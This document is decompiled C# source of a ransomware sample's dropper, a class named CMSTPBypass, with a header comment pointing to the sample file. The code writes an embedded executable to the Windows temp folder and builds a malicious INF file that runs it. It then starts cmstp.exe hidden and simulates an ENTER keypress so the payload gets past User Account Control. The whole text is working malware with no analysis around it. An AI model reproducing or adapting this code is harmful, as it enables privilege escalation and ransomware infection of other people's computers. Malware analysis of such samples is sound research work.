// Decompiled with JetBrains decompiler
// Type: CMSTPBypass
// Assembly: X, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: AEE98CA5-AF2D-46DD-B39E-259B864672D1
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan-Ransom.MSIL.Encoder.gen-5469182495d92a5718e0e1dcdf371e92b79724e427050154f318de693d341c89.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

public class CMSTPBypass
{
  public static string InfData = "[version]\nSignature=$chicago$\nAdvancedINF=2.5\n\n[DefaultInstall]\nCustomDestination=CustInstDestSectionAllUsers\nRunPreSetupCommands=RunPreSetupCommandsSection\n\n[RunPreSetupCommandsSection]\n; Commands Here will be run Before Setup Begins to install\nREPLACE_COMMAND_LINE\ntaskkill /IM cmstp.exe /F\n\n[CustInstDestSectionAllUsers]\n49000,49001=AllUSer_LDIDSection, 7\n\n[AllUSer_LDIDSection]\n\"HKLM\", \"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE\", \"ProfileInstallPath\", \"%UnexpectedError%\", \"\"\n\n[Strings]\nServiceName=\"Crimson\"\nShortSvcName=\"Crimson\"\n\n";
  public static string BinaryPath = "c:\\windows\\system32\\cmstp.exe";

  [DllImport("user32.dll")]
  public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

  [DllImport("user32.dll", SetLastError = true)]
  public static extern bool SetForegroundWindow(IntPtr hWnd);

  public static string SetInfFile(string CommandToExecute)
  {
    string str1 = Path.GetRandomFileName().Split(Convert.ToChar("."))[0];
    string str2 = Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\temp";
    StringBuilder stringBuilder1 = new StringBuilder();
    stringBuilder1.Append(str2);
    stringBuilder1.Append("\\");
    stringBuilder1.Append(str1);
    stringBuilder1.Append(".inf");
    StringBuilder stringBuilder2 = new StringBuilder(CMSTPBypass.InfData);
    stringBuilder2.Replace("REPLACE_COMMAND_LINE", CommandToExecute);
    File.WriteAllText(stringBuilder1.ToString(), stringBuilder2.ToString());
    return stringBuilder1.ToString();
  }

  public static void Main()
  {
    try
    {
      string path = Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\temp\\" + Path.GetRandomFileName().Split(Convert.ToChar("."))[0] + ".exe";
      File.WriteAllBytes(path, CMSTPBypass.GetResource("4yd4xfaaoyr"));
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.Append(CMSTPBypass.SetInfFile("cmd /c start \"" + path + "\""));
      Process.Start(new ProcessStartInfo(CMSTPBypass.BinaryPath)
      {
        Arguments = "/au " + stringBuilder.ToString(),
        UseShellExecute = false,
        CreateNoWindow = true,
        WindowStyle = ProcessWindowStyle.Hidden
      });
      IntPtr num = new IntPtr();
      num = IntPtr.Zero;
      do
        ;
      while (CMSTPBypass.SetWindowActive("cmstp") == IntPtr.Zero);
      SendKeys.SendWait("{ENTER}");
    }
    catch
    {
    }
    Environment.Exit(0);
  }

  public static IntPtr SetWindowActive(string ProcessName)
  {
    Process[] processesByName = Process.GetProcessesByName(ProcessName);
    if (processesByName.Length == 0)
      return IntPtr.Zero;
    processesByName[0].Refresh();
    IntPtr num = new IntPtr();
    IntPtr mainWindowHandle = processesByName[0].MainWindowHandle;
    if (mainWindowHandle == IntPtr.Zero)
      return IntPtr.Zero;
    CMSTPBypass.SetForegroundWindow(mainWindowHandle);
    CMSTPBypass.ShowWindow(mainWindowHandle, 5);
    return mainWindowHandle;
  }

  private static byte[] GetResource(string file) => (byte[]) new ResourceManager("wobvod1h2nl", Assembly.GetExecutingAssembly()).GetObject(file);
}
